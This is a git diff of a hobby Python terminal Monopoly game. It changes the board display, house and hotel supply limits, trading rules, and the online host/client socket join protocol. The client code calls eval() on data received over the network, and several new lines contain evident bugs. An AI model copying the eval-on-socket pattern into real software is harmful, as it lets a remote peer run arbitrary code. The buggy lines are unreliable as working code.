@@ -21,19 +21,17 @@ dev_mode = False
 house_total = 32
 hotel_total = 12
 time_played = 0
-game_version = 0.7
+game_version = 0.9
 player_turn = None
 
-# the players' icons can only appear in certain points, 
-# so this list will has the default and modified art for the board
-# the default space is blank but there are some special cases that are specified individually
-# (1st item = default art | 2nd item = modified art | 3rd item = standard/irregular display type)
-player_display_location = [["          ", "          ", True] for i in range(41)]
+# player icons can only appear in certain points here
+# default space is blank but some special cases specified individually
+player_display_location = [["          ", True] for i in range(41)]
 
-player_display_location[7] = ["    ()    ", "    ()    ", False]
-player_display_location[22] = ["    / /   ", "    / /   ", False]
-player_display_location[36] = ["  \\_|    ", "  \\_|    ", False]
-player_display_location[40] = [" ║ ║ ║ ║ ", " ║ ║ ║ ║ ", False]
+player_display_location[7] = ["    ()    ", False] # False = irregular
+player_display_location[22] = ["    / /   ", False]
+player_display_location[36] = [ "  \\_|    ", False]
+player_display_location[40] = [" ║ ║ ║ ║ ", False]
 
 property_data = [{} for i in range(28)]
 
@@ -214,17 +212,15 @@ def update_player_position(_pos: int, _action = "add"):
     if _action == "add": players_pos[player_turn - 1] = _pos
 
     layout = {
-        "_":{1: "    p    ", 2: "  p  p  ", 3: " p p p ", 4: "p pp p"},
-        7:  {1: " p ()    ", 2: " p () p ", 3: "pp() p ", 4: "pp()pp"},
-        22: {1: " p / /   ", 2: " p / /p ", 3: "pp/ /p ", 4: "pp/ pp"},
-        36: {1: r"  \_| p ", 2: r"p\_| p ", 3: r"p\_|pp", 4: "ppp|p" },
-        40: {1: " ║ p║ ║ ",  2: " p║ ║p ",  3: " pp║p ",  4: "pp pp" }
+        "_":{0: "          ", 1: "    p    ", 2: "  p  p  ", 3: " p p p ", 4: "p pp p"},
+        7:  {0: "    ()    ", 1: " p ()    ", 2: " p () p ", 3: "pp() p ", 4: "pp()pp"},
+        22: {0: "    / /   ", 1: " p / /   ", 2: " p / /p ", 3: "pp/ /p ", 4: "pp/ pp"},
+        36: {0: "  \\_|    ", 1: r"  \_| p ", 2: r"p\_| p ", 3: r"p\_|pp", 4: "ppp|p" },
+        40: {0: " ║ ║ ║ ║ ", 1: " ║ p║ ║ ",  2: " p║ ║p ",  3: " pp║p ",  4: "pp pp" }
     }
 
     # determines what layout to retrieve
-    if players_pos.count(_pos) == 0:
-        order = player_display_location[_pos][0]
-    elif player_display_location[_pos][2] == True:
+    if player_display_location[_pos][1] == True:
         order = layout["_"][players_pos.count(_pos)]
     else:
         order =layout[_pos][players_pos.count(_pos)]
@@ -242,8 +238,9 @@ def update_player_position(_pos: int, _action = "add"):
             while players_pos[x] != _pos: x = next(player_itr)
 
             string += player[x + 1]["char"]
-        
-    player_display_location[_pos][1] = string
+
+    # updates display
+    player_display_location[_pos][0] = string
  
 
 class player_is_broke_class(parent_class):
@@ -993,6 +990,8 @@ class display_property_class(parent_class):
 
     def input_management(self, user_input):
         """determines what action to perform with user input"""
+        global house_total
+        global hotel_total
 
         def exit_bid(self):
             """resets bid variables, auctions next property if exists"""
@@ -1126,6 +1125,10 @@ class display_property_class(parent_class):
                 display_property_list(display_property_list.player)
   
             elif user_input in ["t", "T"]:
+                if property_data[self.property]["upgrade state"] > 0:
+                    print("\n    === you cannot trade upgraded properties ===\n\n    ", end="")
+                    return
+
                 if trade_screen.is_trade:
                     trade_screen.add_prop_offer(display_property.property)
                     self(self.property)
@@ -1181,8 +1184,20 @@ class display_property_class(parent_class):
                     if prop["upgrade state"] < property_data[self.property]["upgrade state"]:
                         print("\n    === other properties in this colour set have not been upgraded equally ===\n\n    ", end="")
                         return
+                
+                # determines whether a house or hotel is needed and available
+                if property_data[self.property]["upgrade state"] < 7:
+                    if house_total < 0:
+                        print("\n    === there are no more houses left. all 32 have been purchased ===\n\n    ", end="")
+                        return
+                    house_total -= 1
+                else:
+                    if hotel_total < 0:
+                        print("\n    === there are no more hotels left. all 16 have been purchased ===\n\n    ", end="")
+                        return
+                    hotel_total -= 1
 
-                # if the exit conditions are passed, then the code are executed
+                # if exit conditions are passed, then the player can upgrade
                 player[property_data[self.property]["owner"]]["$$$"] -= property_data[self.property]["house cost"]
                 property_data[self.property]["upgrade state"] += 1
                 self(self.property)
@@ -1200,12 +1215,22 @@ class display_property_class(parent_class):
                         print("\n    === other properties in this colour set have not been downgraded equally ===\n\n    ", end="")
                         return
 
+                # adds the house/hotel back into the pool
+                if property_data[self.property]["upgrade state"] == 8:
+                    hotel_total += 1
+                else:
+                    house_total += 1
+
                 player[property_data[self.property]["owner"]]["$$$"] += property_data[self.property]["house cost"] / 2
                 property_data[self.property]["upgrade state"] -= 1
 
                 self(self.property)
 
             elif user_input in ["r", "R"] and trade_screen.is_trade:
+                
+                if not (self.property in trade_screen.player_1["props"] or self.property in trade_screen.player_2["props"]):
+                    print("\n    === command not recognised ===\n\n    ", end="")
+                    return
 
                 # removes the property from the appropriate player's trade
                 if self.property in trade_screen.player_1["props"]:
@@ -1749,8 +1774,8 @@ homescreen = homescreen_class()
 class online_config_class(parent_class):
     """contains the menus and sockets for starting an online game
 
-    note: as a client, .joined_clients is [[name, name], [icon, icon]]
-    while as a host, [[name, socket, icon], [name, socket, icon]]"""
+    note: as a client, .joined_clients is [[name, name], [icon, icon], [ID, ID]]
+    while as a host, [[name, socket, icon, ID], [name, socket, icon, ID]]"""
     def __init__(self):
         self.__name__ = self.__class__.__name__[:-6]
         self.joined_clients = []
@@ -1758,11 +1783,11 @@ class online_config_class(parent_class):
         self.action_2 = None
         self.display_name = ""
         self.display_icon = ""
-        self.SERVER_PORT = None
-        self.SERVER_IP_V4 = None
         self.socket_type = None
         self.stop_event = asyncio.Event()
-        self.is_online = False
+        self.recv_users_event = asyncio.Event()
+        self.is_online = False # used for game logic differences
+        self.player_num = None # ID for specific player
 
         # creates a new socket for connection
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1778,7 +1803,10 @@ class online_config_class(parent_class):
 
     def mode_select(self):
         clear_screen()
+
         self.action = "mode select"
+        self.is_online = True
+
         print()
         for line in create_button_prompts(["Host", "Join", "Back"], spacing=[4, 3, 6]):
             print(line)
@@ -1833,6 +1861,34 @@ class online_config_class(parent_class):
         print("    ║                             [ENTER]                            ║")
         print("    ║                                                                ║")
         print("    ╚════════════════════════════════════════════════════════════════╝")
+        print("\n    ", end="")
+
+    def wrong_version_notice(self):
+        """alerts the user that they are not playing on the same version as host"""
+        global current_screen
+        current_screen = self.__name__
+        self.action = "connection lost accept"
+
+        # closes and re-creates the socket
+        self.socket.close()
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        # ahhhhrgh I had to make this a bit wider to fit the link,
+        # hopefully no-one will notice
+        clear_screen()
+        print()
+        print("    ╔═════════════════════════════════════════════════════════════════════╗")
+        print("    ║                                                                     ║")
+        print("    ║                               NOTICE:                               ║")
+        print("    ║                                                                     ║")
+        print("    ║           Your game version is not the same as the host.            ║")
+        print("    ║                     get the latest update from:                     ║")
+        print("    ║                                                                     ║")
+        print("    ║ https://github.com/James-Edelman/text-based-monopoly-python-version ║")
+        print("    ║                                                                     ║")
+        print("    ║                               [ENTER]                               ║")
+        print("    ║                                                                     ║")
+        print("    ╚═════════════════════════════════════════════════════════════════════╝")
         print("\n    ", end="")
 
     def host_wait_screen(self, connection_details: str | None = None):
@@ -1899,6 +1955,8 @@ class online_config_class(parent_class):
             if not lock:
                 name += " (host)"
                 lock = True
+            if name == self.display_name:
+                name += " (you)"
 
             extra_space = ""
             extra_extra_space = ""
@@ -1917,11 +1975,11 @@ class online_config_class(parent_class):
         print("    ", end="")
 
     async def get_users(self):
-        """allows the host to receive users"""
+        """allows the host to receive users. Handles connection protocol"""
         if self.socket_type != "host": return
 
         loop = asyncio.get_running_loop()
-        while not self.stop_event.is_set():
+        while not self.stop_event.is_set() and not self.recv_users_event.is_set():
             
             # gets a client
             try:
@@ -1931,15 +1989,42 @@ class online_config_class(parent_class):
             except OSError:
                 return
 
-            _, name, icon = client.recv(1024).decode().split(":") # client sends name immediately after connection
+            # clients sends version first thing
+            client_version = int(client.recv(1024).decode())
+
+            # host sends confirmation that both on same version
+            if client_version == game_version:
+                client.sendall("True".encode())
+            else:
+                client.sendall("False".encode())
+                continue
+            # client sends name immediately after connection
+            _, name, icon, num = client.recv(1024).decode().split(":")
+
+            # determines client id number
+            found_num = False
+            while not found_num:
+
+                # checks if ID already taken
+                for item in self.joined_clients:
+                    if item[3] == num:
+                        client.sendall("False".encode())
+                        num = int(client.recv(1024).decode())
+                        continue
+
+                # if no matches, (or no other clients)
+                found_num = True
+                client.sendall("True".encode())
+           
             client.setblocking(False)
-            self.joined_clients.append([name, client, icon])
+            self.joined_clients.append([name, client, icon, num])
 
             # alerts all clients to update in players
-            client_list = [[self.display_name], [self.display_icon]]
+            client_list = [[self.display_name], [self.display_icon], [1]]
             for item in self.joined_clients:
                 client_list[0].append(item[0])
                 client_list[1].append(item[2])
+                client_list[2].append(item[3])
 
             for item in self.joined_clients:
                 item[1].sendall(f"users update:{client_list}".encode())
@@ -1954,7 +2039,10 @@ class online_config_class(parent_class):
         global player
         global player_turn
 
-        if self.action == "name 1":
+        if user_input == "DISPLAY CLIENTS":
+            print(self.joined_clients)
+
+        elif self.action == "name 1":
 
             # gets display name then player icon (see below)
             self.display_name = user_input
@@ -2020,6 +2108,8 @@ class online_config_class(parent_class):
 
                 player_turn = 1
 
+                # ensures users can no longer be accepted
+                self.recv_users_event.set()
                 display_game_notice()
 
             elif user_input in ["k", "K"]:
@@ -2030,13 +2120,14 @@ class online_config_class(parent_class):
 
                 # alerts all clients that the host has canceled
                 for items in self.joined_clients:
-                    items[1].send("%hostquit%")
+                    try: items[1].send("%hostquit%")
+                    except: pass
 
                 # quits the asyncio.gather()
-                # (this is just a backup, it's actually stopped by closing the socket)
                 self.stop_event.set()
 
                 # ensures other coroutine won't be permanently waiting for another connection
+                self.socket.shutdown(socket.SHUT_RDWR)
                 self.socket.close()
 
                 # recreates the socket for next use
@@ -2050,9 +2141,9 @@ class online_config_class(parent_class):
         elif self.action == "client wait screen":
             if self.action_2 == "enter details":
                 try:
-                    self.SERVER_IP_V4, server_port = user_input.strip().split("-")
-                    self.SERVER_PORT = int(server_port)
-                    self.socket.connect((self.SERVER_IP_V4, self.SERVER_PORT))
+                    SERVER_IP_V4, server_port = user_input.strip().split("-")
+                    SERVER_PORT = int(server_port)
+                    self.socket.connect((SERVER_IP_V4, SERVER_PORT))
 
                 # bit lazy using a bare except,
                 # but it should suffice as a basic catch-all
@@ -2068,40 +2159,62 @@ class online_config_class(parent_class):
                     print("\n    === Error using join code. please try again ===\n\n    ", end="")
                     return
 
-                # protocol is for joined clients to send name, receive host name
-                self.socket.sendall(f"clientjoin:{self.display_name}:{self.display_icon}".encode())
-                _, client_list = self.socket.recv(1024).decode().split(":")
-                client_list = eval(client_list)
+                # see below loop
+                num = 2 # #1 reserved for host
 
-                # for clients, arranged: [[name, name],[icon, icon]]
-                # (host always is first)
-                online_config.joined_clients = client_list
+                # protocol is for joined clients to ensure same version
+                self.socket.sendall(str(game_version).encode())
+                same_ver = self.socket.rev(1024).decode()
+                if same_ver != "True":
+                    self.wrong_version_notice()
+                    return
+
+                # then names are exchanged
+                self.socket.sendall(f"clientjoin:{self.display_name}:{self.display_icon}:{num}".encode())
+
+                # finds unique ID number with host help
+                found_num = False
+                
+                while found_num != True:
+                    found_num = self.socket.recv(1024).decode()
+
+                    # only strings can be sent
+                    if found_num == "True":
+                        found_num = True
+                    else:
+                        num += 1 # process repeats until valid number
+                        self.socket.sendall(str(num).encode())
+
+                self.player_num = num
+
+                # receives list of playing clients
+                _, client_list = self.socket.recv(1024).decode().split(":")
+                online_config.joined_clients = eval(client_list)
 
                 print(f"\n    === connected to {self.joined_clients[0][0]}'s game. waiting for host start ===\n\n    ", end="")
-
+ 
                 # ensures that client screen commands are accessible
                 self.action_2 = None
 
                 self.client_wait_screen()
                 asyncio.run(self.shell())
 
-            else:
-                if user_input in ["b", "B"]:
-                    self.socket.send("clientquit".encode())
+            elif user_input in ["b", "B"]:
+                self.socket.sendall("clientquit".encode())
 
-                    # quits the asyncio.gather()
-                    # (this is just a backup, it's actually stopped by closing the socket)
-                    self.stop_event.set()
+                # quits the asyncio.gather()
+                self.stop_event.set()
 
-                    # ensures other coroutine won't be permanently waiting for another connection
-                    self.socket.close()
+                # ensures other coroutine won't be permanently waiting for another connection
+                self.socket.setblocking(False)
+                self.socket.close()
 
-                    # recreates the socket for next use
-                    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                # recreates the socket for next use
+                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 
-                    self.mode_select()
-                else:
-                    print("\n    === command not recognised ===\n\n    ", end="")
+                self.mode_select()
+            else:
+                print("\n    === command not recognised ===\n\n    ", end="")
 
         elif self.action == "connection lost accept":
             self.stop_event.set()
@@ -2111,6 +2224,7 @@ class online_config_class(parent_class):
             if user_input in ["h", "H"]:
 
                 self.socket_type = "host"
+                self.player_num = 1
 
                 # gets user IP
                 self.U_NAME = socket.gethostname()
@@ -2143,6 +2257,7 @@ class online_config_class(parent_class):
                 print("enter connection details: ", end = "")
 
             elif user_input in ["b", "B"]:
+                self.is_online = False
                 homescreen()
 
             else:
@@ -2233,7 +2348,7 @@ class trade_screen_class(parent_class):
         self.curr_player = self.player_1
         self.__name__ = self.__class__.__name__[:-6]
 
-    def __call__(self, player_: int | None = player_turn , queued_prop: int | None = None):
+    def __call__(self, player_: int | None = player_turn, queued_prop: int | None = None):
         """
         adds the given player as player 1 of the bid,
         and prompts the player who they would like to trade with.
@@ -2387,13 +2502,13 @@ class trade_screen_class(parent_class):
             self.player_2["props"].append(_property) 
 
     def trade_completed(self):
+        """displays trade confirmation and handles transferring logic"""
         clear_screen()
 
         # displays trade successful art
         # if players trade nothing, this variant appears
-
         if not self.player_1["props"] and not self.player_2["props"] and \
-           self.player_1["$$$"] == 0 and self.player_2["$$$"] == 0:
+           self.player_1["$$$"] == self.player_2["$$$"] == 0:
             print(self.nothing_art)
         else:
             print(self.prop_prop_money_art)
@@ -2409,8 +2524,58 @@ class trade_screen_class(parent_class):
         player[self.player_2["player"]]["$$$"] -= self.player_2["$$$"]
 
         # updates the properties
-        for prop in self.player_1["props"]: property_data[prop]["owner"] = self.player_2["player"]  
-        for prop in self.player_2["props"]: property_data[prop]["owner"] = self.player_1["player"]
+        # (I know this is disgustingly long and poorly coded)
+        for player_prop in self.player_1["props"]:
+            property_data[player_prop]["owner"] = self.player_2["player"]  
+            if property_data[player_prop]["type"] == "station":
+                continue
+
+            colour_set = []
+
+            for sub_prop in self.player_1["props"]:
+                if not ("colour set" in property_data[sub_prop].keys() and "colour set" in property_data[player_prop].keys()):
+                    continue
+
+                if property_data[sub_prop]["colour set"] == property_data[player_prop]["colour set"]:
+                    colour_set.append(sub_prop)
+                         
+            # ensures that if all properties in a colour set are traded,
+            # they keep relevant upgrade state, otherwise return to default
+            if (len(colour_set) == 3 and property_data[player_prop]["colour set"] not in [0, 7]) \
+                or (len(colour_set) == 2 and property_data[player_prop]["colour set"] in [0, 7]):
+
+                for _prop in colour_set:
+                    if _prop["upgrade state"] != -1:
+                        _prop["upgrade state"] = 2
+            else:
+                for _prop in colour_set:
+                    if _prop["upgrade state"] == 2:
+                        _prop["upgrade state"] = 1
+       
+        for player_prop in self.player_2["props"]:
+            property_data[player_prop]["owner"] = self.player_1["player"]  
+            if property_data[player_prop]["type"] == "station":
+                continue
+
+            colour_set = []
+
+            for sub_prop in self.player_1["props"]:
+                if not ("colour set" in property_data[sub_prop].keys() and "colour set" in property_data[player_prop].keys()):
+                    continue
+
+                if property_data[sub_prop]["colour set"] == property_data[player_prop]["colour set"]:
+                    colour_set.append(sub_prop)
+                         
+            if (len(colour_set) == 3 and property_data[player_prop]["colour set"] not in [0, 7]) \
+                or (len(colour_set) == 2 and property_data[player_prop]["colour set"] in [0, 7]):
+
+                for _prop in colour_set:
+                    if _prop["upgrade state"] != -1:
+                        _prop["upgrade state"] = 2
+            else:
+                for _prop in colour_set:
+                    if _prop["upgrade state"] == 2:
+                        _prop["upgrade state"] = 1
         
         self.is_trade = False
 
@@ -2591,22 +2756,36 @@ class refresh_board_class(parent_class):
             The player currently playing has a border around them.
 
             alt_position should always be the bigger number.
-            """            
+            """
             def top_info():
 
                 # form the borders surrounding the player if it's their turn
                 outer = " "
-                if player_turn == players_playing - (position - 1): outer = "│"
+                if player_turn == turn_spot: outer = "│"
 
-                return f"{outer} player {players_playing - (position - 1)} | {player[players_playing - (position - 1)]['char']} {outer}"
+                return f"{outer} player {turn_spot} | {player[turn_spot]['char']} {outer}"
 
             def bottom_info():
-                outer = " "; extra_space = ""
+                outer = extra_space = extra_extra_space = output = ""
 
-                if player_turn == players_playing - (position - 1): outer = "│"
-                for i in range(12 - len(str(player[players_playing - (position - 1)]["$$$"]))): extra_space += " "
+                if player_turn == turn_spot: outer = "│"
+                else: outer = " "
 
-                return f"{outer} ${player[players_playing - (position - 1)]['$$$']}{extra_space} {outer}"
+                if player[turn_spot]["status"] in ("playing", "jail"):
+                    for i in range(12 - len(str(player[turn_spot]["$$$"]))):
+                        extra_space += " "
+
+                    output =  f"{outer} ${player[turn_spot]['$$$']}{extra_space} {outer}"
+
+                # displays the player's status if not playing
+                else:
+                    for i in range((11 - len(player[turn_spot]["status"])) // 2):
+                        extra_space += " "
+                    if len(player[turn_spot]["status"]) % 2 == 1:
+                        extra_extra_space = " "
+
+                    output = f"{outer}{extra_space} = {player[turn_spot]["status"].upper()} ={extra_extra_space}{extra_space}{outer}"
+                return output
 
             def outer():
                 if   player_turn == players_playing - (position - 1)    : return "┌───────────────┐"
@@ -2614,6 +2793,7 @@ class refresh_board_class(parent_class):
                 else                                                    : return "                 "
 
             output = "                 " # 17 spaces
+            turn_spot = players_playing - (position - 1)
 
             # check if there is a player to display at this location
             if position <= players_playing: output = locals()[next(self.money_structure)]()
@@ -2663,25 +2843,25 @@ class refresh_board_class(parent_class):
         print("")
         print("     ▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁")
         print(f"    \x1b[7m▊\x1b[0m▛               ▎{houses(14)}▎  __()_   ▎{houses(15)}▎{houses(16)}\x1b[0m▎   $200 __\x1b[7m▊\x1b[0m{houses(18)}\x1b[7m▊\x1b[0m{houses(19)}▎   $150   \x1b[7m▊\x1b[0m{houses(21)}\x1b[7m▊\x1b[0m   GO TO JAIL  ▜▎")
-        print(f"    \x1b[7m▊\x1b[0m  FREE PARKING  ▎          ▎  \\__ \\   ▎          ▎          \x1b[0m▎_()_()_| /\x1b[7m▊\x1b[0m          \x1b[7m▊\x1b[0m          ▎{player_display_location[28][1]}\x1b[7m▊\x1b[0m          \x1b[7m▊\x1b[0m     {player_display_location[30][1]} ▎")
-        print(f"    \x1b[7m▊\x1b[0m      ____      ▎{player_display_location[21][1]}▎{player_display_location[22][1]}▎{player_display_location[23][1]}▎{player_display_location[24][1]}\x1b[0m▎\\  ____ _)\x1b[7m▊\x1b[0m{player_display_location[26][1]}\x1b[7m▊\x1b[0m{player_display_location[27][1]}▎    /\\    \x1b[7m▊\x1b[0m{player_display_location[29][1]}\x1b[7m▊\x1b[0m  /¯¯¯¯\\        ▎")
+        print(f"    \x1b[7m▊\x1b[0m  FREE PARKING  ▎          ▎  \\__ \\   ▎          ▎          \x1b[0m▎_()_()_| /\x1b[7m▊\x1b[0m          \x1b[7m▊\x1b[0m          ▎{player_display_location[28][0]}\x1b[7m▊\x1b[0m          \x1b[7m▊\x1b[0m     {player_display_location[30][0]} ▎")
+        print(f"    \x1b[7m▊\x1b[0m      ____      ▎{player_display_location[21][0]}▎{player_display_location[22][0]}▎{player_display_location[23][0]}▎{player_display_location[24][0]}\x1b[0m▎\\  ____ _)\x1b[7m▊\x1b[0m{player_display_location[26][0]}\x1b[7m▊\x1b[0m{player_display_location[27][0]}▎    /\\    \x1b[7m▊\x1b[0m{player_display_location[29][0]}\x1b[7m▊\x1b[0m  /¯¯¯¯\\        ▎")
         print("    \x1b[7m▊\x1b[0m     /[__]\\     ▎          ▎  / /  /\\ ▎          ▎          \x1b[0m▎/__)  /_\\ \x1b[7m▊\x1b[0m          \x1b[7m▊\x1b[0m          ▎   /  \\   \x1b[7m▊\x1b[0m          \x1b[7m▊\x1b[0m | (¯¯)/¯¯¯¯\\   ▎")
-        print(f"    \x1b[7m▊\x1b[0m    |_ () _|    ▎          ▎  \\ ‾-‾ / ▎  Fleet   ▎Trafalgar ▎{player_display_location[25][1]}\x1b[7m▊\x1b[0mLeicester \x1b[7m▊\x1b[0m Coventry ▎  |    |  \x1b[7m▊\x1b[0m          \x1b[7m▊\x1b[0m  \\_¯¯| (¯¯) |  ▎")
+        print(f"    \x1b[7m▊\x1b[0m    |_ () _|    ▎          ▎  \\ ‾-‾ / ▎  Fleet   ▎Trafalgar ▎{player_display_location[25][0]}\x1b[7m▊\x1b[0mLeicester \x1b[7m▊\x1b[0m Coventry ▎  |    |  \x1b[7m▊\x1b[0m          \x1b[7m▊\x1b[0m  \\_¯¯| (¯¯) |  ▎")
         print("    \x1b[7m▊\x1b[0m     U----U     ▎  Strand  ▎   ‾---‾  ▎  Street  ▎  Square  \x1b[0m▎Fenchurch \x1b[7m▊\x1b[0m  Square  \x1b[7m▊\x1b[0m  Street  ▎   \\__/   \x1b[7m▊\x1b[0mPiccadilly\x1b[7m▊\x1b[0m    \\/ \\_¯¯_/   ▎")
-        print(f"    \x1b[7m▊\x1b[0m   {player_display_location[20][1]}   \x1b[48;2;248;49;47m▎          \x1b[0m▎  CHANCE  \x1b[48;2;248;49;47m▎          ▎          \x1b[0m▎ Station  \x1b[7m▊\x1b[0m\x1b[48;2;255;176;46m          \x1b[30m\x1b[7m▊\x1b[0m\x1b[48;2;255;176;46m          \x1b[0m▎WaterWorks\x1b[7m▊\x1b[0m\x1b[48;2;255;176;46m          \x1b[7m▊\x1b[0m     O   \\/     ▎")
+        print(f"    \x1b[7m▊\x1b[0m   {player_display_location[20][0]}   \x1b[48;2;248;49;47m▎          \x1b[0m▎  CHANCE  \x1b[48;2;248;49;47m▎          ▎          \x1b[0m▎ Station  \x1b[7m▊\x1b[0m\x1b[48;2;255;176;46m          \x1b[30m\x1b[7m▊\x1b[0m\x1b[48;2;255;176;46m          \x1b[0m▎WaterWorks\x1b[7m▊\x1b[0m\x1b[48;2;255;176;46m          \x1b[7m▊\x1b[0m     O   \\/     ▎")
         print("    \x1b[7m▊\x1b[0m                \x1b[48;2;248;49;47m▎          \x1b[0m▎          \x1b[48;2;248;49;47m▎          ▎          \x1b[0m▎          \x1b[7m▊\x1b[0m\x1b[48;2;255;176;46m          \x1b[30m\x1b[7m▊\x1b[0m\x1b[48;2;255;176;46m          \x1b[0m▎          \x1b[7m▊\x1b[0m\x1b[48;2;255;176;46m          \x1b[7m▊\x1b[0m      O O       ▎")
         print("    \x1b[7m▊\x1b[0m▔▔▔▔▔▔▔▔▔▔▔▔\x1b[48;2;255;103;35m▔▔▔▔\x1b[0m▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜\x1b[48;2;0;210;106m▔▔▔▔\x1b[0m▔▔▔▔▔▔▔▔▔▔▔▔▎")
         print(f"    \x1b[7m▊\x1b[0mVine Street \x1b[48;2;255;103;35m    \x1b[0m▎    {icon(14)}                    {icon(15)}         {icon(16)}         {icon(17)}         {icon(18)}         {icon(19)}         {icon(20)}         {icon(21)}    \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m    \x1b[0m Regent St. ▎")
         print(f"    \x1b[7m▊\x1b[0m {houses(13)} \x1b[48;2;255;103;35m    \x1b[0m▎ {icon(13)}  _____     __          ___    ___  ___   ______     ______       {self.player_turn_display[player_turn][0]}                  {icon(22)} \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m    \x1b[0m {houses(22)} ▎")
-        print(f"    \x1b[7m▊\x1b[0m {player_display_location[19][1]} \x1b[48;2;255;103;35m    \x1b[0m▎    |  _  \\   |  |        /   \\   \\  \\/  /  |  ____|   |  __  \\      {self.player_turn_display[player_turn][1]}                     \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m    \x1b[0m {player_display_location[31][1]} ▎")
+        print(f"    \x1b[7m▊\x1b[0m {player_display_location[19][0]} \x1b[48;2;255;103;35m    \x1b[0m▎    |  _  \\   |  |        /   \\   \\  \\/  /  |  ____|   |  __  \\      {self.player_turn_display[player_turn][1]}                     \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m    \x1b[0m {player_display_location[31][0]} ▎")
         print(f"    \x1b[7m▊\x1b[0m▁▁▁▁▁▁▁▁▁▁▁▁\x1b[48;2;255;103;35m▁▁▁▁\x1b[0m▎    |  ___/   |  |__     /  ^  \\   \\_  _/   |  __|_    |      /      {self.player_turn_display[player_turn][2]}                     \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m\x1b[30m▁▁▁▁\x1b[0m▁▁▁▁▁▁▁▁▁▁▁▁▎")
         print(f"    \x1b[7m▊\x1b[0mMarlborough \x1b[48;2;255;103;35m    \x1b[0m▎    |__|      |_____|   /__/¯\\__\\   |__|    |______|   |__|\\__\\      {self.player_turn_display[player_turn][3]}                     \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m    \x1b[0m            ▎")
         print("    \x1b[7m▊\x1b[0m   Street   \x1b[48;2;255;103;35m    \x1b[0m▎                                                                                                  \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m    \x1b[0m Oxford St. ▎")
         print(f"    \x1b[7m▊\x1b[0m {houses(12)} \x1b[48;2;255;103;35m    \x1b[0m▎ {icon(12)}   ____       _____      __                                                                 {icon(23)} \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m    \x1b[0m {houses(23)} ▎")
-        print(f"    \x1b[7m▊\x1b[0m {player_display_location[18][1]} \x1b[48;2;255;103;35m    \x1b[0m▎     /  __|     /     \\    |  |                                                                   \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m    \x1b[0m {player_display_location[32][1]} ▎")
+        print(f"    \x1b[7m▊\x1b[0m {player_display_location[18][0]} \x1b[48;2;255;103;35m    \x1b[0m▎     /  __|     /     \\    |  |                                                                   \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m    \x1b[0m {player_display_location[32][0]} ▎")
         print("    \x1b[7m▊\x1b[0m▁▁▁▁▁▁▁▁▁▁▁▁\x1b[48;2;255;103;35m▁▁▁▁\x1b[0m▎    |  |_  |   |  (_)  |   |__|                                                                   \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m▁▁▁▁\x1b[0m▁▁▁▁▁▁▁▁▁▁▁▁▎")
         print("    \x1b[7m▊\x1b[0m COMUNITY CHEST ▎     \\____/     \\_____/    (__)                                                                   \x1b[7m▊\x1b[0m COMUNITY CHEST ▎")
-        print(f"    \x1b[7m▊\x1b[0m   {player_display_location[17][1]}   ▎                                                                                                  \x1b[7m▊\x1b[0m   {player_display_location[33][1]}   ▎")
+        print(f"    \x1b[7m▊\x1b[0m   {player_display_location[17][0]}   ▎                                                                                                  \x1b[7m▊\x1b[0m   {player_display_location[33][0]}   ▎")
     
         button_states = [False, True, False, True]
 
@@ -2701,10 +2881,12 @@ class refresh_board_class(parent_class):
                 prompt_2 = "Properties"
                 break
 
+        # additional logic is required for online
+        online_check = lambda: True if (online_config.player_num == player_turn or not online_config.is_online) else False
+
         # similar checks are performed for the other prompts
-        # if the player has spent 3 turns in jail, they MUST pay bail, regardless
-        if player_movement.dice_rolled == False and self.action == None and player[player_turn]["jail time"] < 3:
-            button_states[0] = True
+        # if the player has spent 3 turns in jail, they MUST pay bail, regardless of conditions
+        button_states[0] = (online_check() and player_movement.dice_rolled == False and self.action == None and player[player_turn]["jail time"] < 3)
 
         if self.action == None and player_movement.dice_rolled == True:
             button_states[2] = True
@@ -2730,17 +2912,17 @@ class refresh_board_class(parent_class):
         button_list = create_button_prompts(button_states[0], button_states[1], [0, 3])
 
         print(f"    \x1b[7m▊\x1b[0m {houses(11)} \x1b[48;2;255;103;35m    \x1b[0m▎ {icon(11)} {button_list[0]}                                                    {icon(24)} \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m    \x1b[0m {houses(24)} ▎")
-        print(f"    \x1b[7m▊\x1b[0m {player_display_location[16][1]} \x1b[48;2;255;103;35m    \x1b[0m▎    {button_list[1]}                                                       \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m    \x1b[0m {player_display_location[34][1]} ▎")
+        print(f"    \x1b[7m▊\x1b[0m {player_display_location[16][0]} \x1b[48;2;255;103;35m    \x1b[0m▎    {button_list[1]}                                                       \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m    \x1b[0m {player_display_location[34][0]} ▎")
